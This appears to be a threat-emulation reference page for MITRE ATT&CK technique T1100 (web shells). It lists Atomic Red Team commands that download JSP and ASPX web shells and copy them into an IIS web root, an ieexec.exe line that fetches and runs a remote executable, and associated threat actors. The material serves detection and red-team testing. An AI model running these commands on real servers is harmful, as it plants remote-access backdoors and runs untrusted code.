
# Web Shell

## Description

### MITRE Description

> A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

## Additional Attributes

* Bypass: None
* Effective Permissions: ['SYSTEM', 'User']
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1100

## Potential Commands

```
xcopy #{web_shells} C:\inetpub\wwwroot

xcopy PathToAtomicsFolder\T1100\src\ #{web_shell_path}

ieexec.exe http://*:8080/bypass.exe
```

## Commands Dataset

```
[{'command': 'xcopy #{web_shells} C:\\inetpub\\wwwroot\n',
  'name': None,
  'source': 'atomics/T1100/T1100.yaml'},
 {'command': 'xcopy PathToAtomicsFolder\\T1100\\src\\ #{web_shell_path}\n',
  'name': None,
  'source': 'atomics/T1100/T1100.yaml'},
 {'command': 'ieexec.exe http://*:8080/bypass.exe',
  'name': None,
  'source': 'Threat Hunting Tables'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Web Shell': {'atomic_tests': [{'dependencies': [{'description': 'Web '
                                                                                          'shell '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'on '
                                                                                          'disk '
                                                                                          'at '
                                                                                          'specified '
                                                                                          'location '
                                                                                          '(#{web_shells})\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Type '
                                                                                                 'Directory '
                                                                                                 '(split-path '
                                                                                                 '#{web_shells}) '
                                                                                                 '-ErrorAction '
                                                                                                 'ignore '
                                                                                                 '| '
                                                                                                 'Out-Null\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/b.jsp"\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/test.jsp"\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/cmd.aspx"\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{web_shells}) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'an '
                                                                        'adversary '
                                                                        'leveraging '
                                                                        'Web '
                                                                        'Shells '
                                                                        'by '
                                                                        'simulating '
                                                                        'the '
                                                                        'file '
                                                                        'modification '
                                                                        'to '
                                                                        'disk.\n'
                                                                        'Idea '
                                                                        'from '
                                                                        'APTSimulator.\n'
                                                                        'cmd.aspx '
                                                                        'source '
                                                                        '- '
                                                                        'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n',
                                                         'executor': {'cleanup_command': 'del '
                                                                                         '#{web_shell_path} '
                                                                                         '>nul '
                                                                                         '2>&1\n',
                                                                      'command': 'xcopy '
                                                                                 '#{web_shells} '
                                                                                 '#{web_shell_path}\n',
                                                                      'name': 'command_prompt'},
                                                         'input_arguments': {'web_shell_path': {'default': 'C:\\inetpub\\wwwroot',
                                                                                                'description': 'The '
                                                                                                               'path '
                                                                                                               'to '
                                                                                                               'drop '
                                                                                                               'the '
                                                                                                               'web '
                                                                                                               'shell',
                                                                                                'type': 'string'},
                                                                             'web_shells': {'default': 'PathToAtomicsFolder\\T1100\\src\\',
                                                                                            'description': 'Path '
                                                                                                           'of '
                                                                                                           'Web '
                                                                                                           'Shell',
                                                                                            'type': 'path'}},
                                                         'name': 'Web Shell '
                                                                 'Written to '
                                                                 'Disk',
                                                         'supported_platforms': ['windows']}],
                                       'attack_technique': 'T1100',
                                       'display_name': 'Web Shell'}},
 {'Threat Hunting Tables': {'chain_id': '100211',
                            'commandline_string': 'http://*:8080/bypass.exe',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md',
                            'loaded_dll': '',
                            'mitre_attack': 'T1100',
                            'mitre_caption': 'web_shell',
                            'os': 'windows',
                            'parent_process': 'ieexec.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [OilRig](../actors/OilRig.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
